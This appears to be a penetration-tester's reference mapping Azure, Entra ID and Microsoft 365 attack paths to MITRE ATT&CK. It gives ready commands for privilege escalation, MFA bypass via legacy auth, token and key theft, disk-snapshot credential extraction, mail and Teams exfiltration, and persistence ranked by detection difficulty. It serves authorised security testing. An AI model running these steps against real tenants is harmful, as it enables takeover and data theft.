# Azure Exploit Mapping Reference

Detailed Azure attack paths, privilege escalation routes, and MITRE ATT&CK Cloud mapping for penetration testers.

## Entra ID (Azure AD) Attack Paths

### Path 1: Application Admin to Global Admin
- **Condition:** User has Application Administrator or Cloud Application Administrator role
- **Attack:** Add credentials to an existing service principal that has Global Admin or Privileged Role Administrator
- **Commands:**
```bash
# List service principals with high-privilege roles
az role assignment list --all --query "[?roleDefinitionName=='Global Administrator' || roleDefinitionName=='Privileged Role Administrator'].{principal:principalName,role:roleDefinitionName}" --output table

# Add a new secret to the target app registration
az ad app credential reset --id {app-id} --append
```
- **ATT&CK:** T1098.001 (Additional Cloud Credentials)
- **Difficulty:** Medium
- **Detection risk:** Medium (credential changes are logged in Entra audit logs)

### Path 2: Intune Administrator Abuse
- **Condition:** User has Intune Administrator role
- **Attack:** Deploy scripts to Intune-managed devices to extract credentials, install backdoors, or pivot into on-prem
- **Commands:**
```powershell
# Using Graph API to deploy a script to managed devices
$scriptContent = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('whoami > C:\temp\output.txt'))

$body = @{
    displayName = "System Health Check"
    scriptContent = $scriptContent
    runAsAccount = "system"
    enforceSignatureCheck = $false
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts" -Method POST -Headers @{Authorization="Bearer $token"} -Body $body -ContentType "application/json"
```
- **ATT&CK:** T1059 (Command and Scripting Interpreter)
- **Difficulty:** Medium
- **Detection risk:** High (Intune actions are logged)

### Path 3: Conditional Access Bypass via Legacy Authentication
- **Condition:** Organization relies on Conditional Access but hasn't blocked legacy auth protocols
- **Attack:** Use legacy authentication (IMAP, POP3, SMTP) to bypass MFA requirements
- **Commands:**
```bash
# Test IMAP access (bypasses MFA if legacy auth not blocked)
curl -u "user@domain.com:password" imaps://outlook.office365.com/INBOX

# Test SMTP
python3 -c "
import smtplib
s = smtplib.SMTP('smtp.office365.com', 587)
s.starttls()
s.login('user@domain.com', 'password')
print('Login successful - legacy auth not blocked')
s.quit()
"
```
- **ATT&CK:** T1078.004 (Valid Accounts: Cloud)
- **Difficulty:** Low
- **Detection risk:** Low (sign-in logs show it but often not alerted on)

### Path 4: Guest User Escalation
- **Condition:** Guest users have excessive permissions or can enumerate directory
- **Attack:** Abuse guest user access to read directory, find privileged users, or access shared resources
- **Commands:**
```bash
# Check what guest users can see
az ad user list --query "[?userType=='Guest']" --output table

# As guest user, enumerate directory
az ad user list --output table
az ad group list --output table
az role assignment list --all --output table
```
- **ATT&CK:** T1087.004 (Account Discovery: Cloud)
- **Difficulty:** Low
- **Detection risk:** Low

## Azure Resource Attack Paths

### Path 5: Function App to Subscription Takeover
- **Condition:** Azure Function with managed identity that has Contributor or higher on the subscription
- **Attack:** Exploit web vulnerability in the function (SSRF, injection) or abuse deployment credentials to execute code as the managed identity
- **Commands:**
```bash
# If you can execute code in the function context
# Get managed identity token
curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
    "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/" \
    -s | jq .

# Use token to enumerate subscription
TOKEN={access_token from above}
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .

# List all resources
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions/{sub-id}/resources?api-version=2021-04-01" | jq .
```
- **ATT&CK:** T1550.001 (Application Access Token)
- **Difficulty:** Medium
- **Detection risk:** Low (function executions are expected)

### Path 6: Logic App Connector Credential Theft
- **Condition:** Access to Logic Apps with API connections (connectors to O365, SQL, Blob, etc.)
- **Attack:** Logic App connectors store authenticated sessions. Read connector configs to extract or reuse credentials.
- **Commands:**
```bash
# List Logic Apps
az logic workflow list --output table

# Show Logic App definition (may contain hardcoded values)
az logic workflow show --name {name} --resource-group {rg} --query 'definition'

# List API connections (connectors)
az resource list --resource-type Microsoft.Web/connections --output table

# Get connection details
az resource show --ids {connection-resource-id} --api-version 2018-07-01-preview
```
- **ATT&CK:** T1552 (Unsecured Credentials)
- **Difficulty:** Medium
- **Detection risk:** Low

### Path 7: Azure DevOps Pipeline Abuse
- **Condition:** Access to Azure DevOps with pipeline permissions
- **Attack:** Modify or create pipelines to exfiltrate secrets, access service connections (often have high-privilege access to Azure subscriptions)
- **Commands:**
```bash
# List projects
az devops project list --org https://dev.azure.com/{org}

# List pipelines
az pipelines list --org https://dev.azure.com/{org} --project {project}

# List service connections (these often have Contributor or Owner on subscriptions)
az devops service-endpoint list --org https://dev.azure.com/{org} --project {project}

# Variable groups may contain secrets
az pipelines variable-group list --org https://dev.azure.com/{org} --project {project}
```
- **ATT&CK:** T1199 (Trusted Relationship)
- **Difficulty:** Medium
- **Detection risk:** Medium

### Path 8: Cosmos DB Key Extraction
- **Condition:** Permission to list Cosmos DB keys
- **Attack:** Cosmos DB primary/secondary keys grant full access to all data, bypassing RBAC
- **Commands:**
```bash
# List Cosmos DB accounts
az cosmosdb list --output table

# Extract keys (these give full data plane access)
az cosmosdb keys list --name {account} --resource-group {rg}

# Connect with extracted key
pip install azure-cosmos
python3 -c "
from azure.cosmos import CosmosClient
client = CosmosClient('https://{account}.documents.azure.com:443/', '{primary-key}')
for db in client.list_databases():
    print(f'Database: {db[\"id\"]}')
    db_client = client.get_database_client(db['id'])
    for container in db_client.list_containers():
        print(f'  Container: {container[\"id\"]}')
"
```
- **ATT&CK:** T1530 (Data from Cloud Storage)
- **Difficulty:** Low
- **Detection risk:** Low (diagnostic logging often not enabled on Cosmos DB)

### Path 9: Disk Snapshot Abuse
- **Condition:** Permission to create or access disk snapshots
- **Attack:** Snapshot a VM's OS disk, attach to attacker-controlled VM, extract credentials from filesystem
- **Commands:**
```bash
# Create snapshot of target VM's OS disk
DISK_ID=$(az vm show --name {target-vm} --resource-group {rg} --query 'storageProfile.osDisk.managedDisk.id' --output tsv)

az snapshot create --name exfil-snap --resource-group {rg} --source $DISK_ID

# Create a new disk from snapshot
az disk create --name exfil-disk --resource-group {rg} --source exfil-snap

# Attach to your VM
az vm disk attach --vm-name {your-vm} --name exfil-disk --resource-group {rg}

# Mount and extract (from inside your VM)
# sudo mount /dev/sdc1 /mnt/exfil
# Look for: SAM/SYSTEM hives, .ssh/authorized_keys, .bash_history, config files
```
- **ATT&CK:** T1578.002 (Create Cloud Instance)
- **Difficulty:** Medium
- **Detection risk:** Medium (disk and snapshot operations are logged)

### Path 10: Azure Arc Pivot to On-Prem
- **Condition:** Azure Arc-connected on-premise servers
- **Attack:** Use Azure management plane access to execute commands on Arc-connected on-prem servers
- **Commands:**
```bash
# List Arc-connected machines
az connectedmachine list --output table

# Run command on Arc machine (pivots from cloud to on-prem)
az connectedmachine run-command create \
    --machine-name {arc-machine} \
    --resource-group {rg} \
    --name "recon" \
    --script "whoami && hostname && ipconfig /all"
```
- **ATT&CK:** T1021 (Remote Services)
- **Difficulty:** Low
- **Detection risk:** Medium

## Microsoft 365 Attack Paths

### Path 11: Mail and SharePoint Data Exfiltration
- **Condition:** Access with Mail.Read, Files.Read, or similar Graph API permissions
- **Attack:** Exfiltrate emails, SharePoint/OneDrive files using Graph API
- **Commands:**
```bash
# Read user's mail
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/me/messages?\$top=50&\$select=subject,from,body"

# Search mail for sensitive content
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/me/messages?\$search=\"password OR credential OR secret OR API key\""

# List SharePoint sites
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/sites?search=*"

# List OneDrive files
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/me/drive/root/children"
```
- **ATT&CK:** T1114.002 (Remote Email Collection)
- **Difficulty:** Low
- **Detection risk:** Low (Graph API calls often not monitored)

### Path 12: Teams Message and Chat Exfiltration
- **Condition:** Access with Chat.Read or ChannelMessage.Read permissions
- **Attack:** Read Teams chats and channels for credentials, internal discussions, architecture details
- **Commands:**
```bash
# List joined teams
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/me/joinedTeams"

# Read channel messages
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/teams/{team-id}/channels/{channel-id}/messages"

# Read 1:1 chats
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/me/chats"
```
- **ATT&CK:** T1530 (Data from Cloud Storage)
- **Difficulty:** Low
- **Detection risk:** Low

## Azure Lateral Movement Mapping

When mapping lateral movement opportunities in Azure, check these connections:

1. **Subscription to subscription:** Management group inheritance, cross-subscription role assignments
2. **Azure to M365:** Entra ID roles that grant access to both Azure resources and M365 services
3. **Azure to on-prem:** Azure AD Connect, Azure Arc, VPN Gateway, ExpressRoute
4. **Azure to DevOps:** Service connections, pipeline managed identities
5. **Resource to resource:** Managed identity chains, Key Vault references, App Service to SQL, Function to Storage

## Azure Persistence Mapping

| Technique | Detection Difficulty | Cleanup Difficulty |
|-----------|---------------------|-------------------|
| Add SP credentials | Medium | Easy |
| New app registration | Medium | Easy |
| Automation runbook | Low | Easy |
| PIM eligible assignment | High | Medium |
| Conditional Access exclusion | Medium | Easy |
| B2B guest invite with roles | High | Medium |
| Custom role with hidden perms | High | Hard |
| Diagnostic settings modification | High | Medium |
